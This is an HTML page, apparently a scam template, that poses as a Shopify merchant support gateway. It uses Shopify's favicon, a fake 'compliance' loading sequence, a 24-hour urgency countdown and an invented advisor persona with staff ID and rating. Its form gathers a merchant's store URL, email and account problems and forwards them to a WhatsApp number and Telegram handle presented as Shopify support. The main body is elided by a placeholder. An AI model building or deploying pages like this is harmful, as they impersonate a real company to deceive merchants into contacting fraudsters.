<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Merchant Support Gateway â€” Independent Partner</title>

  <!-- Tailwind Play CDN (fast way to style without build) -->
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    .fade-in { animation: fadeIn .28s ease both; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px) } to { opacity: 1; transform: none } }
    .toast { position: fixed; right: 20px; bottom: 20px; z-index: 9999; }
    .spinner { border: 3px solid #e5e7eb; border-top: 3px solid #10b981; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
  </style>

  <link id="faviconLink" rel="icon" href="">
</head>
<body class="bg-gray-50 text-gray-900 antialiased">

<script>
  const CONFIG = {
    logoUrl: "https://cdn.shopify.com/static/shopify-favicon.png",
    whatsappNumber: "2349135251130",
    telegramUsername: "Xcellexert",
    supportEmail: "support@example.com",
    advisor: {
      name: "Juan Manuel",
      title: "Compliance & Merchant Support Advisor",
      partnerBadge: "Independent Partner Resource",
      staffId: "ADV-342991",
      caseId: "CS-114882",
      years: "5+ years",
      merchantsHelped: 76,
      rating: 4.9,
      photoUrl: "https://i.pinimg.com/736x/1c/65/b3/1c65b3c672767808e39ba1669c8e1482.jpg"
    },
    countdownHours: 24,
    ticketId: "SHOP-9001"
  };
</script>

<!-- LOADING -->
<div id="loading" class="min-h-screen flex items-center justify-center px-6">
  <div class="max-w-md w-full text-center">
    <img id="logoTopLoading" alt="Logo" class="mx-auto mb-4 w-14 h-14 rounded-full object-cover border border-emerald-200" src="" />
    <h2 id="loadingMsg" class="text-lg font-semibold mb-3">Preparing your workspaceâ€¦</h2>
    <div class="spinner" aria-hidden="true"></div>
  </div>
</div>

<main id="main" class="hidden min-h-screen pb-12"> ... (UNCHANGED CONTENT ABOVE FOOTER) ... </main>

<!-- MODAL POPUP (form updated) -->
<div id="modal" class="fixed inset-0 hidden items-center justify-center bg-black bg-opacity-40 z-50">
  <div class="bg-white rounded-2xl shadow-xl p-6 w-full max-w-md fade-in">
    <div class="flex justify-between items-center mb-4">
      <h3 class="text-lg font-semibold">Submit Ticket (ID: <span id="ticketIdText"></span>)</h3>
      <button id="modalClose" class="text-gray-500 hover:text-gray-700">âœ•</button>
    </div>
    <div>
      <label class="text-xs text-gray-600">Store URL</label>
      <input id="inputStore" class="w-full border rounded-lg p-2 mb-3" placeholder="example.myshopify.com"/>
      <label class="text-xs text-gray-600">Email</label>
      <input id="inputEmail" type="email" class="w-full border rounded-lg p-2 mb-3" placeholder="you@example.com"/>

      <label class="text-xs text-gray-600">Store Status</label>
      <select id="inputStatus" class="w-full border rounded-lg p-2 mb-3">
        <option>Active</option>
        <option>New</option>
        <option>Struggling</option>
        <option>Locked / Disabled</option>
      </select>

      <label class="text-xs text-gray-600">Main Challenge</label>
      <select id="inputChallenge" class="w-full border rounded-lg p-2 mb-3">
        <option>Compliance</option>
        <option>SEO & Visibility</option>
        <option>Conversion / CRO</option>
        <option>Checkout & Payments</option>
        <option>Other</option>
      </select>

      <label class="text-xs text-gray-600">Details</label>
      <textarea id="inputDetails" class="w-full border rounded-lg p-2 mb-4" placeholder="Briefly describe your issue"></textarea>

      <div class="flex gap-3">
        <button id="sendBtn" class="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white py-2 rounded-lg">Submit & Open Channel</button>
        <button id="cancelBtn" class="flex-1 border rounded-lg py-2">Cancel</button>
      </div>
      <p class="mt-3 text-xs text-gray-500">Ticket ID will be included in every message: <strong id="ticketIdText2"></strong></p>
    </div>
  </div>
</div>

<div id="toast" class="toast hidden">
  <div class="bg-emerald-600 text-white px-4 py-2 rounded shadow">âœ… Ticket submitted â€” opening your chat...</div>
</div>

<script>
  const FALLBACK_PHOTO = "https://images.unsplash.com/photo-1593032457860-9e1d5bc3c7d4?q=80&w=640&auto=format&fit=crop";
  const stepsMsgs = ["Checking your store setupâ€¦","Syncing compliance dataâ€¦","Preparing staff advisorâ€¦"];

  document.addEventListener("DOMContentLoaded", () => {
    document.getElementById('faviconLink').href = CONFIG.logoUrl;
    document.getElementById('logoTopLoading').src = CONFIG.logoUrl;
    cycleLoadingMsgs();
    runProgress();
    initCountdown();
    document.querySelectorAll('.contactBtn').forEach(btn => btn.addEventListener('click', () => openModal(btn.getAttribute('data-channel'))));
    document.getElementById('modalClose').addEventListener('click', closeModal);
    document.getElementById('cancelBtn').addEventListener('click', closeModal);
    document.getElementById('sendBtn').addEventListener('click', sendTicket);
    document.getElementById('ticketIdText').innerText = CONFIG.ticketId;
    document.getElementById('ticketIdText2').innerText = CONFIG.ticketId;
  });

  function cycleLoadingMsgs(){
    let i=0;const msgEl=document.getElementById('loadingMsg');
    setInterval(()=>{msgEl.innerText=stepsMsgs[i%stepsMsgs.length];i++;},1500);
  }

  function runProgress(){
    setTimeout(()=>{document.getElementById('loading').classList.add('hidden');document.getElementById('main').classList.remove('hidden');},5000);
  }

  function initCountdown(){
    const elTimer=document.getElementById('countdown');
    const todayKey=new Date().toDateString();
    let startTs=localStorage.getItem('countdownStart');
    let savedDay=localStorage.getItem('countdownDay');
    if(!startTs || savedDay!==todayKey){
      startTs=Date.now();localStorage.setItem('countdownStart',startTs);localStorage.setItem('countdownDay',todayKey);
    }
    const total=CONFIG.countdownHours*3600;
    const tick=()=>{const elapsed=Math.floor((Date.now()-startTs)/1000);const remaining=Math.max(total-elapsed,0);const h=Math.floor(remaining/3600);const m=Math.floor((remaining%3600)/60);const s=remaining%60;elTimer.innerText=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;};
    tick();setInterval(tick,1000);
  }

  let activeChannel=null;
  function openModal(channel){activeChannel=channel;document.getElementById('modal').classList.remove('hidden');setTimeout(()=>document.getElementById('inputStore').focus(),120);}
  function closeModal(){document.getElementById('modal').classList.add('hidden');}
  function showToast(){const t=document.getElementById('toast');t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),4000);}

  function sendTicket(){
    const store=document.getElementById('inputStore').value.trim();
    const email=document.getElementById('inputEmail').value.trim();
    const status=document.getElementById('inputStatus').value;
    const challenge=document.getElementById('inputChallenge').value;
    const details=document.getElementById('inputDetails').value.trim();
    if(!store||!email){alert('Please provide Store URL and Email before continuing.');return;}
    const ticket=CONFIG.ticketId;
    const message=`ðŸŸ¢ Shopify Support Ticket Created\nTicket ID: ${ticket}\nStore: ${store}\nEmail: ${email}\nStatus: ${status}\nChallenge: ${challenge}\nDetails: ${details}`;
    const encoded=encodeURIComponent(message);
    if(activeChannel==='whatsapp'){window.open(`https://wa.me/${CONFIG.whatsappNumber}?text=${encoded}`,'_blank');}
    else if(activeChannel==='telegram'){window.open(`https://t.me/${CONFIG.telegramUsername}?text=${encoded}`,'_blank');}
    else if(activeChannel==='email'){window.location.href=`mailto:${CONFIG.supportEmail}?subject=${encodeURIComponent('Support Ticket '+ticket)}&body=${encoded}`;}
    closeModal();showToast();
    document.getElementById('inputStore').value='';
    document.getElementById('inputEmail').value='';
    document.getElementById('inputDetails').value='';
    document.getElementById('inputStatus').selectedIndex=0;
    document.getElementById('inputChallenge').selectedIndex=0;
  }
</script>

</body>
</html>
